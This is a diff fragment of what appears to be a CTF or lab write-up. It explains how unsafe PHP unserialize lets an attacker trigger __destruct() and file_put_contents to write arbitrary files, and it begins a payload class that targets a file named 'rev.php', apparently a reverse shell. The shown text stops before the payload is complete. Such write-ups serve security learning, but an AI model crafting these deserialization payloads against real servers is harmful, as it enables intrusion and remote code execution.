@@ -79,7 +79,7 @@ $app -> update_db();
 The file uses unserialize on a user's input which is unsafe, read more here(https://www.sjoerdlangkemper.nl/2021/04/04/remote-code-execution-through-unsafe-unserialize/). I can call the **__destruct()** function which calls **file_put_contents** which means I can put arbitrary file to the server.
 
 So I craft the payload.
-```bash
+```php
 <?php
 class DatabaseExport{
   public $user_file = 'rev.php';
